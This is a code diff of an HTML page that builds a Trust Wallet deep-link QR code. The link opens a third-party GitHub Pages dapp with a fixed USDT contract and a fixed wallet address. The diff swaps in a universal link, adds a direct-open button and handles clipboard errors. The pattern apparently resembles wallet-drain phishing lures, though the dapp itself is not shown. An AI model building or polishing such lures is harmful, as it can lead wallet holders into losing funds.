@@ -133,7 +133,7 @@
 
   <main class="card">
     <h1>Trust Wallet Deep Link</h1>
-    <p>Scan this QR code with any camera or scanner to open directly in Trust Wallet DApp Browser.</p>
+    <p>Scan with your camera or Chrome, tap the detected link, then confirm Open in Trust Wallet. Trust Wallet must be installed.</p>
 
     <div class="qr-container">
       <img id="qrImage" src="" alt="Trust Wallet Deep Link QR Code">
@@ -146,25 +146,37 @@
       <button class="btn btn-secondary" id="copyBtn" type="button">
         📋 Copy Deep Link
       </button>
+      <a class="btn btn-secondary" id="directOpenBtn" href="">App installed? Open directly</a>
     </div>
 
-    <div class="toast" id="toast">Deep link copied to clipboard!</div>
+    <div class="toast" id="toast" role="status" aria-live="polite">Deep link copied to clipboard!</div>
   </main>
 
   <script>
-    const deeplink = "intent://open_url?coin_id=56&url=https%3A%2F%2Fharendsinghraidfc-afk.github.io%2Ftrust_wallet%2F%3Fasset%3D0x55d398326f99059fF775485246999027B3197955%26address%3D0x3b659063c41015a06D25B933742D0Bd28A04E490#Intent;scheme=trust;package=com.wallet.crypto.trustapp;S.browser_fallback_url=https%3A%2F%2Ftrustwallet.com%2Fdownload;end";
+    const dappUrl = new URL('https://harendsinghraidfc-afk.github.io/trust_wallet/');
+    dappUrl.searchParams.set('asset', '0x55d398326f99059fF775485246999027B3197955');
+    dappUrl.searchParams.set('address', '0x3b659063c41015a06D25B933742D0Bd28A04E490');
+    const walletLink = new URL('https://link.trustwallet.com/open_url');
+    walletLink.searchParams.set('coin_id', '56');
+    walletLink.searchParams.set('url', dappUrl.href);
+    const deeplink = walletLink.href;
 
     document.querySelector('#qrImage').src = 'https://api.qrserver.com/v1/create-qr-code/?size=300x300&data=' + encodeURIComponent(deeplink);
     document.querySelector('#openBtn').href = deeplink;
+    document.querySelector('#directOpenBtn').href = 'trust://open_url?' + walletLink.searchParams.toString();
 
     const copyBtn = document.querySelector('#copyBtn');
     const toast = document.querySelector('#toast');
 
-    copyBtn.addEventListener('click', () => {
-      navigator.clipboard.writeText(deeplink).then(() => {
-        toast.classList.add('show');
-        setTimeout(() => toast.classList.remove('show'), 2000);
-      });
+    copyBtn.addEventListener('click', async () => {
+      try {
+        await navigator.clipboard.writeText(deeplink);
+        toast.textContent = 'Deep link copied to clipboard!';
+      } catch (error) {
+        toast.textContent = 'Copy unavailable. Open the Trust Wallet link using the button above.';
+      }
+      toast.classList.add('show');
+      setTimeout(() => toast.classList.remove('show'), 3000);
     });
   </script>
 
